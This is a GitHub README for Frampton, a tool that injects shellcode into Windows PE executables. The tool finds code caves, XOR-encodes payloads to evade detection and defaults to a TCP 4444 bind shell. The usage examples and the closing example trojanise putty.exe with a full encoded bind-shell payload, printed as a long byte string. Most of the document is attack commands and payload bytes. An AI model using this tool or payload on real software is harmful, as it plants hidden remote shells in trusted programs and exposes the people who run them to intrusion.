# Frampton
[![GitHub pull-requests](https://img.shields.io/github/issues-pr/ins1gn1a/Frampton.svg)](https://GitHub.com/ins1gn1a/Frampton/pulls/)
[![GitHub contributors](https://img.shields.io/github/contributors/ins1gn1a/Frampton.svg)](https://GitHub.com/ins1gn1a/Frampton/graphs/contributors/)
[![GitHub issues](https://img.shields.io/github/issues/ins1gn1a/Frampton)](https://github.com/ins1gn1a/Frampton/issues)
[![GitHub stars](https://img.shields.io/github/stars/ins1gn1a/Frampton)](https://github.com/ins1gn1a/Frampton/stargazers)
[![GitHub license](https://img.shields.io/github/license/ins1gn1a/Frampton)](https://github.com/ins1gn1a/Frampton/blob/master/LICENSE)

PE Binary Shellcode Injector - Automated code cave discovery, shellcode injection, ASLR bypass

## Install
`pip3 install -r requirements.txt`

## Usage
```
usage: frampton.py [-h] --file FILE [--shellcode SHELLCODE] [--output OUTFILE]
                   [--info] [--encoder] [--multi-encoder ENCODERMULTIPLE]

Frampton PE file Injector

optional arguments:
  -h, --help            show this help message and exit
  --file FILE, -f FILE  Filename or path to base template PE file
  --shellcode SHELLCODE, -s SHELLCODE
                        Enter custom shellcode - architecture specific x86/x64
                        (optional) - Default: Windows x86 TCP 4444 Bind Shell
  --output OUTFILE, -o OUTFILE
                        Filename or path to new destination PE file (optional)
  --info, -i            Only display code cave information - does not inject
                        or modify (optional)
  --encoder, -e         Use built-in shellcode XOR encoder - x86 only
                        (optional)
  --multi-encoder ENCODERMULTIPLE, -m ENCODERMULTIPLE
                        Specify the number of auto-generated keys to encode
                        shellcode (optional)
```

#### Information Only (no injection)
```./frampton.py -f FILENAME.exe -i```

![Frampton Example](https://github.com/ins1gn1a/Frampton/blob/master/example2.png?raw=true)


#### Built-in basic bind shell (TCP 4444) 
```./frampton.py -f FILENAME.exe```

#### Built-in basic bind shell (TCP 4444) with XOR encoder
```./frampton.py -f FILENAME.exe -e```

#### Built-in basic bind shell (TCP 4444) with multiple XOR encoder
```./frampton.py -f FILENAME.exe -e -m 4```

#### Custom Shellcode Injector 
```./frampton.py -f FILENAME.exe -s "\xSH\xEL\xCO\xDE\xHE\xRE```

#### Custom Shellcode Injector with XOR encoder
```./frampton.py -f FILENAME.exe -s "\xSH\xEL\xCO\xDE\xHE\xRE -e```

#### Custom Shellcode Injector with multiple XOR encoder
```./frampton.py -f FILENAME.exe -s "\xSH\xEL\xCO\xDE\xHE\xRE -e -m 4```

## Example 

Encoding a 32-bit Putty PE file with Shikata_ga_nai encoding TCP bind shellcode, further encoding with 10 XOR keys.
```
./frampton.py -f putty.exe -e -m 10 -s "\xd9\xe8\xbd\xa0\xdb\xbd\x87\xd9\x74\x24\xf4\x58\x29\xc9\xb1\x53\x83\xc0\x04\x31\x68\x13\x03\xc8\xc8\x5f\x72\xf4\x07\x1d\x7d\x04\xd8\x42\xf7\xe1\xe9\x42\x63\x62\x59\x73\xe7\x26\x56\xf8\xa5\xd2\xed\x8c\x61\xd5\x46\x3a\x54\xd8\x57\x17\xa4\x7b\xd4\x6a\xf9\x5b\xe5\xa4\x0c\x9a\x22\xd8\xfd\xce\xfb\x96\x50\xfe\x88\xe3\x68\x75\xc2\xe2\xe8\x6a\x93\x05\xd8\x3d\xaf\x5f\xfa\xbc\x7c\xd4\xb3\xa6\x61\xd1\x0a\x5d\x51\xad\x8c\xb7\xab\x4e\x22\xf6\x03\xbd\x3a\x3f\xa3\x5e\x49\x49\xd7\xe3\x4a\x8e\xa5\x3f\xde\x14\x0d\xcb\x78\xf0\xaf\x18\x1e\x73\xa3\xd5\x54\xdb\xa0\xe8\xb9\x50\xdc\x61\x3c\xb6\x54\x31\x1b\x12\x3c\xe1\x02\x03\x98\x44\x3a\x53\x43\x38\x9e\x18\x6e\x2d\x93\x43\xe7\x82\x9e\x7b\xf7\x8c\xa9\x08\xc5\x13\x02\x86\x65\xdb\x8c\x51\x89\xf6\x69\xcd\x74\xf9\x89\xc4\xb2\xad\xd9\x7e\x12\xce\xb1\x7e\x9b\x1b\x2f\x76\x3a\xf4\x52\x7b\xfc\xa4\xd2\xd3\x95\xae\xdc\x0c\x85\xd0\x36\x25\x2e\x2d\xb9\x58\xf3\xb8\x5f\x30\x1b\xed\xc8\xac\xd9\xca\xc0\x4b\x21\x39\x79\xfb\x6a\x2b\xbe\x04\x6b\x79\xe8\x92\xe0\x6e\x2c\x83\xf6\xba\x04\xd4\x61\x30\xc5\x97\x10\x45\xcc\x4f\xb0\xd4\x8b\x8f\xbf\xc4\x03\xd8\xe8\x3b\x5a\x8c\x04\x65\xf4\xb2\xd4\xf3\x3f\x76\x03\xc0\xbe\x77\xc6\x7c\xe5\x67\x1e\x7c\xa1\xd3\xce\x2b\x7f\x8d\xa8\x85\x31\x67\x63\x79\x98\xef\xf2\xb1\x1b\x69\xfb\x9f\xed\x95\x4a\x76\xa8\xaa\x63\x1e\x3c\xd3\x99\xbe\xc3\x0e\x1a\xce\x89\x12\x0b\x47\x54\xc7\x09\x0a\x67\x32\x4d\x33\xe4\xb6\x2e\xc0\xf4\xb3\x2b\x8c\xb2\x28\x46\x9d\x56\x4e\xf5\x9e\x72"
```
![Frampton Example](https://github.com/ins1gn1a/Frampton/blob/master/example.png?raw=true)
